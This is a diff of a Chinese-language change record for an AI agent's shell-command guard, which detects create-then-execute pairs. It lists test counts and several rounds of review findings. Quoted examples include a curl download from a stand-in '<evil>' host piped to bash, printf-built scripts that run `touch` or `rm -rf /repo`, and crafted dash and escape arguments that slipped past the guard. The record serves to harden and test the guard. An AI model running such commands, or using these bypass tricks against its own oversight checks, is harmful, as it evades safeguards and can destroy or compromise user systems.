@@ -3,7 +3,7 @@ id: F20261019wvcp
 title: wv 造-执对收编——writerContent 扩 argv 写面（cp/mv/install/ln/tee/curl/wget/dd）+ 链内源内容透传 + 词面证 writeFile 族（M-026d87ff）
 summary: delta5 裁决立案（2026-10-14）的 wv 侧收编：writerContent 原只收重定向/echo/printf/cat/tee/heredoc 写，造-执对不识别 cp/curl -o 等 argv 写通道——`curl -o /tmp/g.sh <evil> && bash /tmp/g.sh` 的造段不进配对识别，掉到 fs 缺席证明（eval 时文件未造出=absent）→ 放行 → 运行时造+执行逃逸（固化失败实证 10 红）。收编三件：①argv 写面进造段识别（内容不可知→fail-closed，与 `echo "$X" > f && bash f` 既有机制同语义）②链内源内容透传（cp/mv/install/ln 保内容拷贝追链内源写段递归重建——corpus TS-402d73e5 服务脚本形态守恒的关键）③词面证补 writeFile/appendFile（delta9 观察1 潜伏面收口）。另修 pair 管道段排除（tee 漏收真根因；delta1 终版=排除整体移除，见审视处置节）。
 change_type: fix
-capability_test: tests/frameworks/agent/wv-creator-exec-pair.test.ts（拦截侧 33 + 放行侧 17 + 词面 3 = 53 例：首轮修前 10 红固化 + delta1 审视修复 20 红固化 + delta2 补刀 5 红固化）+ guard-touchstone exam/corpus 守恒（放行池零 GAP_DIFF、judge 考试零扰动）+ 全量 399 files 6302 passed + 6 skipped 零失败 + tsc/eslint 零报
+capability_test: tests/frameworks/agent/wv-creator-exec-pair.test.ts（拦截侧 38 + 放行侧 21 + 词面 3 = 62 例：首轮修前 10 红固化 + delta1 审视修复 20 红固化 + delta2 补刀 5 红固化 + delta3 交互收口 5 红固化）+ guard-touchstone exam/corpus 守恒（放行池零 GAP_DIFF、judge 考试零扰动）+ 全量 399 files 6311 passed + 6 skipped 零失败 + tsc/eslint 零报
 risk_and_residual: |
   收编方向=多拦不放（fail-closed），主要风险是误拦扩散——以 corpus 守恒+judge 考试零扰动为验收闸（delta5 裁决原文）。实施中 TS-402d73e5（heredoc 造服务脚本 + cp 透传 + node 执行，真实开发形态）翻转红灯，经「链内源内容透传」修回守恒（内容可判读就不该 fail-closed）。残余面（记档）：①tee/管道流输入内容恒不可知=有意保守（delta5 口径明列「管道输入」为不可重建）②跨命令的外部源内容恒 fail-closed ③cp/mv 多源形态逐源候选已覆盖但链式拷贝深度限 4 ④downloadWriteTargets 未知短旗标停扫后簇内 o/O 漏认（保守侧不假提取）、未知长旗标分离值不消耗位置词（保守侧不误吞 URL）⑤正写通道旧口径的常规形态 cp/mv destArgs 顺扫多候选（源混入写面=保守面）保持不动 ⑥动态写目标 × 静态执行面的假缺席证明（`cp -t $VAR src && bash /tmp/g.sh` 形态）=既有模型边界（echo > $F 同形），非本次引入。
 mechanism_budget: |
@@ -52,7 +52,7 @@ causal_links:
 | 6（验证节引用归档即删的 debug 文件） | 本 PR 修——joiner 三段值内联正文（见验证节） | 本文档 |
 | 7（tee argv 面遮蔽重定向面，Z11） | 本 PR 顺手修——writerContent 双写面并集（逐面独立 content/copyOf） | writerContent；Z11 钉 |
 
-**附带修（实现中发现，同分支同型假重建——独立 commit 可剥离）**：printf 旧重建三种形态均把非空文件谎报成错内容（单参丢 format 重建为空串、多参丢 format、转义不解释），`printf 'touch /repo/x\n' > f && bash f` 被判良性放行（逃逸）——pre-existing（#1466 引入），属「造出内容为权威载荷」语义在内容重建上的假实现，与发现 7 同分支同型。delta1 首修（单参=format 本体）后被 delta 复审用哑参/八进制转义绕破（S1/S2），delta2 终版收口（见下节）。corpus 零暴露（无「printf 单参造+执」冻结条目），exam 零扰动实证。若 delta 裁超射程，剥离相应 commit 即可，不影响发现 1-4/6/7 修复。
+**附带修（实现中发现，同分支同型假重建——独立 commit 可剥离）**：printf 旧重建三种形态均把非空文件谎报成错内容（单参丢 format 重建为空串、多参丢 format、转义不解释），`printf 'touch /repo/x\n' > f && bash f` 被判良性放行（逃逸）——pre-existing（#1466 引入），属「造出内容为权威载荷」语义在内容重建上的假实现，与发现 7 同分支同型。delta1 首修（单参=format 本体）后被 delta 复审用哑参/八进制转义绕破（S1/S2），delta2 二修（format 骨架+裸 %s 代入）再被「过滤器×渲染」交互绕破（delta3 发现 1-3），delta3 终版收口（见下节）——「假重建=谎报内容=逃逸面」的三次返工全部栽在同一根因带：重建精度每提一层，被旧过滤器丢掉的词就多骗一层。corpus 零暴露（无「printf 造+执」冻结条目），exam 零扰动实证。
 
 ## 审视处置（delta2，检视獭1554 delta 复审，2026-10-19）
 
@@ -68,10 +68,25 @@ delta1 七条处置逐条复核验证通过（管道排除移除零漂移、旗�
 
 **残余记档（delta2 新增）**：含非 %s 转换符的 printf 造段（如 `printf '%d' 42 > f`）→ null fail-closed（有意保守，非逃逸）；format 含白名单外转义的良性形态同保守侧（多拦不放）。
 
+## 审视处置（delta3，检视獭1554 delta2 复审，2026-10-19）
+
+delta2 派工两焦点裁定全过（S1' 半步采纳不收回处方、S2 保守边界符合 #1513），锚点全复现；但检视獭换机制视角（重建器本身）挖出 3 严重（含 1 个 delta2 自身回归——「含 % 即 null」兜底被精确渲染取消）：
+
+| 发现 | 处置 | 落位 |
+|---|---|---|
+| 1（严重·delta2 回归）：旧 echo 式旗标过滤无条件丢 `-` 词 × %s 空位补空渲染 → dash 实参载荷假良性（`printf '\n%s\n' '-e<NL>touch /repo/data/pwn'`） | 修——printf 分支不再共用 echo 过滤器：不无条件丢 `-` 词（bash builtin 实测选项位仅 -v NAME/--，dash 实参是 %s 数据） | redirectWriteContent；真换行口径钉 + literal \n 口径对照钉 |
+| 2（严重）：`--` 与 dash-format 双过筛重建空串谎报空内容（三代全 ALLOW） | 修——前导 `--` 消费后 format/实参全保留逐词精确重建（format escape 正常解释） | 拦截钉 + 良性 `--` 钉 |
+| 3（严重）：载荷藏被丢实参（`'%s %s\n' 'rm' '-rf /repo'` 重建="rm ") | 修——实参全部保留进 %s 代入（bash 对拍 `rm -rf /repo\n`） | 拦截钉 |
+| 歧义兜底（修法核心，检视獭处方「剥离位落 format/实参位即 null」）：无 `--` 而 format 位是 dash 词 =选项位歧义（builtin 报错空输出 vs POSIX format 输出 vs -v 变量落点，探针 od 实证三态）→ null | fail-closed 兜住 | 2 歧义闸钉 |
+| 4（建议·echo -e \xHH 假重建，echo 同族同病） | 记档独立立案 **M-e4a199a1**（射程外论证见 PR review） | — |
+| 5（建议·族外延 sed -i/tar/unzip/rsync 造-执对缺席） | 记档排期 **M-f6762368**（声明 8 族面本身 8/8 在位 ✓） | — |
+
+**残余记档（delta3 新增）**：无 `--` 的 dash-format/-v 形态一律 null fail-closed（含 builtin 实测本就空输出的良性形态，多拦不放）；echo 分支的旗标过滤未动（M-e4a199a1 射程）。
+
 ## 验证
 
-- **固化失败（修前）**：回归钉 10 红（造-执对 argv 写面全族）+ 8 绿（放行侧/词面字面形态）〔首轮运行记录〕；delta1 修复面修前 20 红固化（新钉对旧码复跑实证）；delta2 修复面修前 5 红固化（S1 哑参/三哑参/S1'/S2 八进制/S2b 十六进制，stash 源码复跑实证）
-- **修后**：同文件 **53/53 绿**（首轮 19 + delta1 钉 26 + delta2 钉 8）；
+- **固化失败（修前）**：回归钉 10 红（造-执对 argv 写面全族）+ 8 绿（放行侧/词面字面形态）〔首轮运行记录〕；delta1 修复面修前 20 红固化（新钉对旧码复跑实证）；delta2 修复面修前 5 红固化（S1 哑参/三哑参/S1'/S2 八进制/S2b 十六进制，stash 源码复跑实证）；delta3 修复面修前 5 红固化（发现 1-3 + 歧义闸 2，stash 源码复跑实证）
+- **修后**：同文件 **62/62 绿**（首轮 19 + delta1 钉 26 + delta2 钉 8 + delta3 钉 9）；
 - **corpus 守恒（delta5 硬闸）**：guard-touchstone exam 放行池/拦截池/条件库 **零 GAP_DIFF**（TS-402d73e5 经透传修回；delta1 旗标/管道/printf 修复经语料暴露面预检（wget/`-O`/`-t`/`--target-directory` 全库 0 条、printf 单参造+执 0 条）+ 复跑双证零扰动；delta2 printf 重建收口同验零扰动）、judge 考试零扰动；
-- **全量**：399 files **6302 passed + 6 skipped 零失败**；tsc / eslint 零报；
+- **全量**：399 files **6311 passed + 6 skipped 零失败**；tsc / eslint 零报；
 - 探针证据（内联，不依赖工作区文件）：`echo pwn | tee x && bash x` 三段 joiner= "" / "|" / "&&"（joiner 挂**入端**：tee 的 joiner="|" 表示 tee 经管道接入上一段）——delta1 起配对判定不再依赖 joiner（写面判定与管道位置无关）；printf 重建 bash 对拍：`printf 'touch /repo/x %s\n' a`→`touch /repo/x a\n`、`'%s-%s\n' a b c`→`a-b\nc-\n`、`'%s\n'`→`\n`（重建与真实输出逐字节一致）。
